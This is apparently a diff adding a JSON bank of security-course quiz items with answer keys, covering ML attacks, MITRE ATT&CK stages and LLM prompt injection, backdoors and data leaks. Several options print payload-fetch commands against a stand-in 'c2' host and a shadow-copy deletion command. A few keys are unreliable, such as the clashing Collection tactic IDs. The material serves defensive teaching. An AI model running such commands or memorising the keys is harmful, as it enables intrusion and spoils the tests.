@@ -1,0 +1,2642 @@
+{
+  "atlas-05": {
+    "questions": [
+      {
+        "q": "Adversarial examples exploit the geometry of neural network decision boundaries — small perturbations in specific directions can cross boundaries while remaining imperceptible to humans.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which adversarial attack method is considered the strongest first-order attack and is the standard for evaluating adversarial robustness?",
+        "options": [
+          "FGSM (Fast Gradient Sign Method) — a single-step attack",
+          "PGD (Projected Gradient Descent) — a multi-step iterated attack"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "The 2017 physical adversarial stop sign experiment demonstrated that adversarial examples only work in digital pipelines and cannot survive real-world printing and lighting conditions.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "In the PGD attack formula, the epsilon (ε) parameter controls:",
+        "options": [
+          "The maximum allowed perturbation size (L∞ norm constraint)",
+          "The number of gradient descent steps performed"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Adversarial training — training on adversarial examples — is currently the most effective known defense against adversarial examples.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-06": {
+    "questions": [
+      {
+        "q": "ML-based security tools like AI antivirus classifiers are immune to adversarial evasion because they use learned features rather than fixed signatures.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "In the Cylance AI bypass, what technique was used to evade the ML antivirus engine?",
+        "options": [
+          "Encrypting the malware payload with a novel cipher algorithm",
+          "Appending benign strings from a video game executable to shift the feature vector"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Functional evasion of an ML malware detector means the modified malware sample both evades detection AND preserves its malicious functionality.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The GAMMA framework applies what technique to automatically evade ML malware detectors?",
+        "options": [
+          "Gradient descent over a differentiable malware feature space",
+          "Brute-force mutation testing across all possible byte sequences"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which defensive approach makes ML malware detectors harder to evade by making their features unpredictable to the attacker?",
+        "options": [
+          "Feature randomization — varying the features used at inference time",
+          "Increasing the training dataset size with more malware samples"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-07": {
+    "questions": [
+      {
+        "q": "A typical production ML pipeline has only one attack surface: the model serving endpoint.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "CI/CD configuration files (like GitHub Actions workflows) can reveal ML pipeline architecture including data storage locations, model registries, and deployment infrastructure.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the Microsoft Tay attack, what pipeline vulnerability did attackers discover and exploit?",
+        "options": [
+          "An unpatched SQL injection in the Tay admin portal",
+          "A 'repeat after me' feature that fed user input directly into the model's training pipeline without filtering"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "If a model registry like MLflow has no authentication on the internal network, what high-impact attack becomes trivial for an attacker with internal network access?",
+        "options": [
+          "Replacing the production model with a backdoored version",
+          "Increasing the model's inference latency via resource exhaustion"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An ML pipeline's retraining schedule (e.g., weekly cron) is relevant to an attacker because it determines the poisoning window — the time window during which injected data will be incorporated into the model.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-08": {
+    "questions": [
+      {
+        "q": "Membership inference attacks exploit the fact that ML models tend to output higher confidence on their training samples than on held-out data.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which formal defense provides mathematical privacy guarantees that limit what membership inference attacks can reveal?",
+        "options": [
+          "Differential privacy (DP-SGD) during model training",
+          "Encrypting the model weights with AES-256 after training"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Model inversion attacks reconstruct approximate representations of training data using only black-box access to the model's outputs.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the Facebook membership inference research, what sensitive attribute could be inferred by querying the ad targeting API?",
+        "options": [
+          "Whether a user had joined a sensitive health group (e.g., HIV+ support)",
+          "Whether a user's account was created with a real or fake identity"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Reducing the precision of confidence scores returned by an ML API (e.g., rounding to 2 decimal places) has no effect on membership inference attack accuracy.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      }
+    ]
+  },
+  "atlas-09": {
+    "questions": [
+      {
+        "q": "Universal adversarial perturbations (UAPs) are image-agnostic — a single perturbation can cause misclassification on most inputs simultaneously.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A backdoored model (BadNets) will typically fail standard accuracy tests because the backdoor degrades its performance on clean inputs.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "What makes clean-label backdoor attacks particularly difficult to detect?",
+        "options": [
+          "They require insider access to the target's training infrastructure",
+          "The poisoned training samples appear correctly labeled to human reviewers"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which tool uses anomaly detection in the feature space to detect backdoor triggers by finding classes whose minimal trigger is unusually small?",
+        "options": [
+          "Neural Cleanse — reverse-engineers triggers for each class and checks for size anomalies",
+          "Foolbox — generates adversarial examples to test model robustness"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "UAPs crafted against one model architecture (e.g., ResNet) often transfer and fool other architectures (e.g., VGG, EfficientNet).",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-10": {
+    "questions": [
+      {
+        "q": "Model extraction attacks can produce a functional substitute model without ever accessing the target model's weights or architecture directly.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Gradient inversion attacks break the privacy guarantee of federated learning by:",
+        "options": [
+          "Intercepting encrypted communications between federated clients and the server",
+          "Reconstructing original training data from the gradient updates clients share with the server"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "The cost asymmetry in model extraction (stealing vs. training from scratch) makes it economically unviable for small to medium ML models.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "In the KnockoffNets extraction of the Acme Sentiment Classifier scenario, what was the cost ratio of stealing vs. building?",
+        "options": [
+          "Over 2,000x cheaper to steal ($240 API+GPU) than to build ($500,000 training)",
+          "Roughly equal cost — model extraction requires similar compute to training"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A key defense against model extraction is to return only hard labels (no confidence scores) from a public ML API.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-11": {
+    "questions": [
+      {
+        "q": "Data poisoning attacks can target a model's availability (degrade accuracy), integrity (cause targeted misclassification), or fairness (introduce demographic bias).",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the Microsoft Tay attack, the poisoning was delivered through which unfiltered pipeline channel?",
+        "options": [
+          "A compromised admin API that accepted direct model weight updates",
+          "A 'repeat after me' feature that incorporated user-provided phrases into the model's training"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Slow, gradual model corruption via a feedback loop is harder to detect than a sudden catastrophic attack because performance metrics degrade gradually.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Activation clustering detects backdoor triggers by finding:",
+        "options": [
+          "Unusual spikes in GPU utilization during model inference",
+          "An anomalous small cluster of samples in the penultimate layer's activation space for a given class"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "In the AcmeBot poisoning scenario, individual poison samples each appeared normal — the malicious bias was only apparent in aggregate across thousands of injected samples.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "atlas-12": {
+    "questions": [
+      {
+        "q": "The complete ATLAS adversarial lifecycle covers 11 tactics, from reconnaissance through to impact on the ML system.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Microsoft Tay kill chain completed from initial access to complete model shutdown in approximately:",
+        "options": [
+          "16 hours at zero cost",
+          "3 weeks at a cost of $50,000 in API queries"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The NIST AI Risk Management Framework (AI RMF) provides the defensive counterpart to ATLAS. Its four core functions are:",
+        "options": [
+          "MAP → MEASURE → MANAGE → GOVERN",
+          "DETECT → RESPOND → RECOVER → IDENTIFY"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Clearview AI operation demonstrated that ATLAS-style threats require sophisticated technical exploits and cannot be executed using only publicly available data.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which ATLAS tactic did the Clearview AI operation primarily use when harvesting 3+ billion facial images from public social media platforms?",
+        "options": [
+          "TA0008 Collection — gathering data at massive scale from public sources",
+          "TA0006 Defense Evasion — bypassing platform security controls"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-01": {
+    "questions": [
+      {
+        "q": "Which ATT&CK tactic ID covers Reconnaissance?",
+        "options": [
+          "TA0043",
+          "TA0042"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Passive reconnaissance (using Shodan, Censys, LinkedIn) sends traffic directly to the target and can trigger IDS alerts.",
+        "options": [
+          "True — passive tools contact the target",
+          "False — passive recon queries public indexes, leaving no trace on the target"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "APT29 (Cozy Bear) spent months in reconnaissance before the SolarWinds breach. What was their primary target in that recon phase?",
+        "options": [
+          "SolarWinds' customer list and build pipeline",
+          "SolarWinds' CEO's personal email account"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Stripping metadata from public documents (T1592.002) is a defender action that reduces the attack surface during the recon phase.",
+        "options": [
+          "True — metadata in PDFs can reveal author, software, and company details",
+          "False — document metadata is encrypted and cannot be read by attackers"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which tool would an attacker use to enumerate subdomains and email addresses from public sources without touching the target?",
+        "options": [
+          "theHarvester (passive OSINT aggregation)",
+          "nmap -sV (active service version scanning)"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-02": {
+    "questions": [
+      {
+        "q": "Resource Development (TA0042) covers activities that happen before the attacker ever contacts a victim. Which technique involves registering lookalike domains and acquiring VPS servers?",
+        "options": [
+          "T1583 — Acquire Infrastructure",
+          "T1566 — Phishing"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Certificate Transparency logs are a defender tool for detecting newly issued TLS certificates for lookalike domains before they are used in attacks.",
+        "options": [
+          "True — CT logs are public and can be monitored for suspicious cert issuance",
+          "False — CT logs are private and only accessible to CAs"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Lazarus Group's Operation AppleJeus involved building fake cryptocurrency companies and trojanized software. Which ATT&CK technique best describes developing that custom malware?",
+        "options": [
+          "T1587 — Develop Capabilities",
+          "T1584 — Compromise Infrastructure"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: A newly registered domain with all WHOIS details hidden and a freshly issued certificate is considered low-risk in threat intelligence analysis.",
+        "options": [
+          "True — new domains are common and should not be flagged automatically",
+          "False — new domain + hidden WHOIS + new cert is a high-risk pattern for attacker infrastructure"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "What technique does JA3 TLS fingerprinting help defenders detect during the resource development and C2 operation phases?",
+        "options": [
+          "Identifying C2 frameworks by their distinctive TLS handshake signature",
+          "Blocking all outbound TLS traffic from corporate endpoints"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-03": {
+    "questions": [
+      {
+        "q": "According to Verizon DBIR data cited in this stage, what percentage of nation-state intrusions use spear phishing as the initial access technique?",
+        "options": [
+          "Over 90%",
+          "Around 40%"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: DMARC p=reject configured on a domain prevents attackers from spoofing that domain in phishing emails.",
+        "options": [
+          "True — DMARC p=reject causes receiving mail servers to discard spoofed emails",
+          "False — DMARC only logs spoofing attempts but cannot block delivery"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the 2016 DNC hack, APT28 gained access to John Podesta's credentials. What made the phishing email convincing?",
+        "options": [
+          "It spoofed a Google security alert and linked to a pixel-perfect login clone",
+          "It was sent from a verified Google email address with an embedded malware attachment"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Seeing WINWORD.EXE spawning powershell.exe as a child process is expected system administration behavior and should not trigger an EDR alert.",
+        "options": [
+          "True — Word uses PowerShell for macro execution in normal operation",
+          "False — this parent-child relationship is a high-fidelity indicator of spear phish exploitation"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which email security technique routes links in emails through a proxy that checks destinations against threat intelligence before allowing the user to visit?",
+        "options": [
+          "URL rewriting / time-of-click protection",
+          "DKIM signature verification"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-04": {
+    "questions": [
+      {
+        "q": "PowerShell Script Block Logging (Event ID 4104) captures the decoded content of encoded PowerShell commands. What GPO setting enables it?",
+        "options": [
+          "EnableScriptBlockLogging = 1 under the PowerShell ScriptBlockLogging registry path",
+          "EnableTranscription = 1 under the Windows Defender registry path"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: LOLBins (Living-off-the-land binaries) like certutil.exe, mshta.exe, and regsvr32.exe are unsigned scripts that bypass antivirus.",
+        "options": [
+          "True — LOLBins are custom attacker scripts that evade detection",
+          "False — LOLBins are legitimate signed Microsoft binaries abused to execute attacker code"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "NotPetya caused $10B in global damage in 2017. Which execution techniques did it rely on to spread without dropping traditional malware?",
+        "options": [
+          "WMI (T1047) and PsExec (T1569.002) — LOLBin-style legitimate Windows tools",
+          "Custom kernel exploits and unsigned driver installation"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: PowerShell Constrained Language Mode (CLM) combined with AppLocker prevents most PowerShell-based execution techniques by restricting access to .NET types and COM objects.",
+        "options": [
+          "True — CLM + AppLocker blocks most PowerShell attacker techniques",
+          "False — CLM only applies to interactive PowerShell sessions, not scripts"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An attacker uses the flag `-Enc` when running powershell.exe. What does this flag do and how do defenders decode it?",
+        "options": [
+          "It base64-encodes the command to obfuscate it; Event ID 4104 captures the decoded content",
+          "It enables encrypted network communication; defenders must capture the traffic with Wireshark"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-05": {
+    "questions": [
+      {
+        "q": "Which Windows Event ID signals that a new Scheduled Task has been created — a key persistence detection point?",
+        "options": [
+          "Event ID 4698",
+          "Event ID 4624"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: APT1 (Comment Crew) maintained access to victim networks for an average of 356 days, relying on layered persistence so that removing one mechanism still left others active.",
+        "options": [
+          "True — APT1 used 20+ persistence techniques simultaneously across victims",
+          "False — APT1 was detected quickly; they relied on speed rather than persistence"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An attacker adds an entry to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Which ATT&CK sub-technique does this represent?",
+        "options": [
+          "T1547.001 — Registry Run Keys / Startup Folder",
+          "T1053.005 — Scheduled Task/Job"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Finding and removing a single persistence mechanism (e.g., a malicious scheduled task) guarantees that the attacker has been fully evicted from the network.",
+        "options": [
+          "True — once the scheduled task is removed, re-entry is blocked",
+          "False — sophisticated attackers layer multiple persistence mechanisms; find them all before declaring clean"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which Sysinternals tool provides a comprehensive inventory of all persistence mechanisms on a Windows system, making it the gold standard for manual persistence hunting?",
+        "options": [
+          "Autoruns.exe",
+          "Process Monitor (procmon.exe)"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-06": {
+    "questions": [
+      {
+        "q": "Kerberoasting (T1558.003) targets service accounts in Active Directory. What does the attacker request, and what do they do with it offline?",
+        "options": [
+          "Service tickets (TGS) encrypted with the service account's password hash, then crack them offline",
+          "Domain Controller replication data containing all NTLM hashes for all users"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: DCSync (T1003.006) requires the attacker to physically access the Domain Controller to extract the NTDS.dit file.",
+        "options": [
+          "True — NTDS.dit can only be copied with physical or RDP access to the DC",
+          "False — DCSync replicates AD password hashes remotely using DC replication rights, without touching the DC directly"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "APT29's Golden SAML attack during the SolarWinds breach involved stealing which certificate from on-premises infrastructure?",
+        "options": [
+          "The ADFS token-signing certificate, enabling forged SAML assertions for any M365 user",
+          "The Domain Controller's TLS certificate, enabling MITM on internal LDAP traffic"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Event ID 4769 with RC4 encryption type (etype 23) in Kerberos service ticket requests is a reliable detection indicator for Kerberoasting.",
+        "options": [
+          "True — modern environments should use AES; RC4 service tickets indicate offline cracking attempts",
+          "False — RC4 Kerberos tickets are standard in all Active Directory environments"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Golden SAML bypasses which critical security control that organizations rely on to protect Microsoft 365 accounts?",
+        "options": [
+          "Multi-Factor Authentication (MFA), because the forged SAML token is trusted without credential verification",
+          "Firewall egress filtering, because SAML tokens travel over HTTP"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-07": {
+    "questions": [
+      {
+        "q": "BYOVD (Bring Your Own Vulnerable Driver) is a defense evasion technique. What does it allow attackers to do that standard user-mode evasion cannot?",
+        "options": [
+          "Operate at kernel privilege to patch EDR callbacks, disabling the EDR from the kernel level",
+          "Bypass Windows Firewall rules by routing traffic through the driver"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: certutil.exe making outbound HTTP connections is expected normal behavior on Windows enterprise endpoints.",
+        "options": [
+          "True — certutil regularly contacts Microsoft servers to validate certificates",
+          "False — certutil.exe should not make outbound network connections; this indicates LOLBin abuse"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "ALPHV/BlackCat used a vulnerable Dell driver (DBUtil_2_3.sys) to kill EDR sensors before deploying ransomware. Which defense specifically blocks BYOVD attacks?",
+        "options": [
+          "HVCI (Hypervisor-Protected Code Integrity) with a strict driver allowlist",
+          "Windows Defender real-time protection with signature updates"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Sysmon Event ID 3 (Network Connection) can detect LOLBin abuse when tools like certutil.exe or mshta.exe make unexpected outbound network connections.",
+        "options": [
+          "True — Sysmon logs all network connections with the process image path, revealing LOLBin network activity",
+          "False — Sysmon Event ID 3 only captures connections from unsigned executables"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which LOLBin technique (T1218.010) allows an attacker to execute a remote COM scriptlet without writing a traditional executable to disk?",
+        "options": [
+          "regsvr32.exe /s /n /u /i:http://c2/payload.sct scrobj.dll",
+          "certutil.exe -urlcache -split -f http://c2/payload.exe"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-08": {
+    "questions": [
+      {
+        "q": "Mimikatz's `sekurlsa::logonpasswords` command dumps credentials from which Windows process?",
+        "options": [
+          "LSASS (Local Security Authority Subsystem Service)",
+          "winlogon.exe (Windows Logon Application)"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Enabling Windows Credential Guard moves LSASS credentials into a Virtualization-Based Security enclave, preventing Mimikatz from dumping them.",
+        "options": [
+          "True — Credential Guard isolates LSASS secrets in a VBS enclave inaccessible to standard Mimikatz",
+          "False — Credential Guard only protects domain credentials, not local account hashes"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "NotPetya spread via a credential cascade. What made admin credential reuse across systems so devastating in that attack?",
+        "options": [
+          "Compromising one system with a cached admin credential gave access to every other system that admin had touched",
+          "The attacker had access to a zero-day that bypassed authentication on all Windows systems"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: WDigest authentication storing plaintext passwords in LSASS memory is enabled by default on modern Windows 10/Server 2016+ systems.",
+        "options": [
+          "True — WDigest is always enabled and cannot be disabled",
+          "False — WDigest is disabled by default on modern Windows; attackers must re-enable it via a registry key"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which Sysmon event ID and access mask combination best detects an unauthorized process reading LSASS memory (credential dumping)?",
+        "options": [
+          "Event ID 10 (Process Access) targeting lsass.exe with GrantedAccess mask 0x1010",
+          "Event ID 4625 (Logon Failure) with SubStatus 0xC000006A"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-09": {
+    "questions": [
+      {
+        "q": "Pass-the-Hash (T1550.002) allows an attacker to authenticate to remote systems without knowing the plaintext password. What does the attacker use instead?",
+        "options": [
+          "The NTLM hash directly as the authentication credential",
+          "A forged Kerberos TGT ticket generated from the password hash"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: In modern enterprise environments, seeing Event ID 4624 with Logon Type 3 (Network) using NtLmSsp (NTLM) authentication is a red flag for Pass-the-Hash activity.",
+        "options": [
+          "True — network logons should use Kerberos; pure NTLM network logons are suspicious",
+          "False — NTLM network logons are standard and expected in all Active Directory environments"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Colonial Pipeline's 2021 ransomware attack started with a compromised VPN account. What single security control, if in place, would most likely have prevented the initial lateral movement?",
+        "options": [
+          "Multi-Factor Authentication (MFA) on the VPN account",
+          "A next-generation firewall with deep packet inspection"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Restricting NTLM network authentication (via Group Policy) and forcing Kerberos prevents Pass-the-Hash because PtH only works with the NTLM authentication protocol.",
+        "options": [
+          "True — PtH exploits NTLM; forcing Kerberos eliminates the attack path",
+          "False — Pass-the-Hash works equally well with Kerberos tickets"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "CrackMapExec is used by attackers to spray an NTLM hash across an entire subnet. What does a successful response from a target host indicate?",
+        "options": [
+          "The hash is valid and the account has admin rights on that target host",
+          "The target host has SMB signing disabled and is vulnerable to relay attacks"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-10": {
+    "questions": [
+      {
+        "q": "APT29 (Midnight Blizzard) collected emails from Microsoft's corporate environment in 2023–2024 using a legacy OAuth application. What made this possible?",
+        "options": [
+          "The legacy OAuth app had excessive Microsoft Graph API permissions (Mail.Read for all users) and was never revoked",
+          "APT29 exploited a zero-day in Microsoft Exchange's on-premises server"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Running `net view /domain`, `nltest /dclist`, and `arp -a` from an internal host are examples of ATT&CK Discovery techniques that use built-in Windows tools.",
+        "options": [
+          "True — these native commands enumerate domain computers and network topology (TA0007)",
+          "False — these are administrative tools that attackers cannot use without special permissions"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An attacker runs a PowerShell script that collects all .docx, .xlsx, and .pdf files modified in the last 90 days and compresses them with a password. Which ATT&CK tactic does this represent?",
+        "options": [
+          "TA0009 Collection — specifically T1119 Automated Collection",
+          "TA0010 Exfiltration — specifically T1048 Exfiltration Over Alternative Protocol"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: A SIEM rule alerting when a single account reads more than 500 files in under 5 minutes is an effective detection for automated collection scripts.",
+        "options": [
+          "True — this volume-based anomaly is a reliable indicator of automated bulk file access",
+          "False — 500 files per 5 minutes is within normal range for document management systems"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "APT29 specifically searched collected emails for keywords like 'APT29' and 'Midnight Blizzard'. What type of intelligence operation does this represent?",
+        "options": [
+          "Counter-intelligence collection — gathering data about what defenders know about the attacker",
+          "Double extortion preparation — identifying executives to threaten with data publication"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-11": {
+    "questions": [
+      {
+        "q": "Equifax's 76-day undetected exfiltration was enabled by a single control failure. What was it?",
+        "options": [
+          "An SSL inspection certificate had expired 19 months earlier, making encrypted exfiltration invisible to monitoring",
+          "The IDS signature database had not been updated, missing the attack pattern"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: DNS tunneling exfiltration (T1048.003) is easily blocked by most enterprise firewalls because DNS traffic on port 53 is denied by default.",
+        "options": [
+          "True — enterprise firewalls block outbound DNS by default",
+          "False — DNS is almost always permitted outbound, making DNS tunneling a preferred covert exfiltration channel"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which network characteristic of DNS exfiltration traffic makes it detectable in firewall or DNS logs?",
+        "options": [
+          "Unusually long subdomain labels (>50 characters) containing base32/base64-encoded data",
+          "High-volume UDP traffic on non-standard ports above 1024"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Splitting exfiltrated data across 20 different destination IPs (as the Equifax attackers did) is an effective technique to stay below per-host volume anomaly detection thresholds.",
+        "options": [
+          "True — distributing traffic across many IPs makes each individual stream appear low-volume",
+          "False — total egress volume is always tracked; splitting IPs does not help evade detection"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which exfiltration technique (T1567) blends stolen data with legitimate cloud traffic, making it harder to block without disrupting business operations?",
+        "options": [
+          "Uploading to public cloud services like Dropbox, Google Drive, or Mega.nz",
+          "Using ICMP echo request/reply packets to carry encoded data"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "mitre-12": {
+    "questions": [
+      {
+        "q": "REvil used Kaseya VSA, an RMM platform, to deploy ransomware to 1,500 businesses simultaneously. Which ATT&CK technique describes this supply chain amplification?",
+        "options": [
+          "T1195.002 — Compromise Software Supply Chain (via MSP/RMM platform)",
+          "T1486 — Data Encrypted for Impact (ransomware encryption only)"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Deleting Volume Shadow Copies (vssadmin delete shadows /all) before encrypting files is a universal pre-step for ransomware deployments, detectable via Event ID 4688.",
+        "options": [
+          "True — VSS deletion removes recovery options and appears in process creation logs",
+          "False — modern ransomware skips VSS deletion because Windows 10 protects shadow copies by default"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What makes immutable backups (e.g., AWS S3 Object Lock in COMPLIANCE mode) effective against ransomware that has Domain Admin access?",
+        "options": [
+          "Immutable backup objects cannot be deleted or overwritten even by admin accounts during the retention period",
+          "They are stored on-premises in an air-gapped server the ransomware cannot reach over the network"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: The Kaseya VSA attack was timed for the July 4th holiday weekend. This timing is coincidental and not a standard ransomware operator tactic.",
+        "options": [
+          "True — ransomware deploys automatically regardless of the time of day or week",
+          "False — attackers deliberately target holidays and weekends to exploit reduced IT staffing and slow incident response"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Modern ransomware groups practice 'double extortion.' What is the second layer of pressure beyond encrypting files?",
+        "options": [
+          "Threatening to publicly publish the exfiltrated data if the ransom is not paid",
+          "Launching a DDoS attack against the victim's public website to amplify disruption"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-01": {
+    "questions": [
+      {
+        "q": "Indirect prompt injection differs from direct injection because the malicious payload is embedded in external content (web pages, documents) the LLM retrieves — not typed directly by the attacker.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which technique best defends against indirect prompt injection in a RAG-enabled assistant?",
+        "options": [
+          "Treat retrieved external content as untrusted data that cannot issue commands",
+          "Use a longer system prompt with more explicit instructions"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The 2024 Bing Chat indirect prompt injection attack exfiltrated user data by hiding instructions in a malicious web page that the AI retrieved and executed.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which architectural control most effectively limits the blast radius of a successful prompt injection?",
+        "options": [
+          "Requiring human confirmation before the LLM takes irreversible actions",
+          "Increasing the token limit of the system prompt"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A system prompt reliably acts as a security boundary that attackers cannot override with crafted user input.",
+        "options": [
+          "False — system prompts can be overridden by sufficiently crafted inputs",
+          "True — the system prompt always takes precedence over user input"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-02": {
+    "questions": [
+      {
+        "q": "LLMs can regurgitate verbatim text — including email addresses, phone numbers, and API keys — that appeared in their training data.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the 2023 Samsung ChatGPT incident, what was the primary risk of employees submitting proprietary source code to ChatGPT?",
+        "options": [
+          "The code could be ingested into OpenAI's training data under default settings",
+          "ChatGPT could directly publish the code on the internet"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A RAG system that stores all users' documents in a shared vector store with no per-user isolation can leak one user's private data to another user.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which control best prevents sensitive data from leaking through a multi-user RAG deployment?",
+        "options": [
+          "Enforce document-level access controls in the vector database, not in the LLM",
+          "Instruct the LLM in its system prompt never to share private information"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Storing a user's API key in the system prompt is a safe practice because the system prompt is never visible to the user.",
+        "options": [
+          "False — system prompt contents can be extracted via prompt injection or direct requests",
+          "True — the system prompt is isolated from user-accessible context"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-03": {
+    "questions": [
+      {
+        "q": "Loading a HuggingFace model saved in Python's Pickle format can execute arbitrary code on the machine that loads it.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which file format was developed specifically to mitigate the code execution risk present in Pickle-based model files?",
+        "options": [
+          "SafeTensors",
+          "ONNX Runtime"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A backdoor-poisoned fine-tuning dataset causes a model to behave maliciously on all inputs once deployed.",
+        "options": [
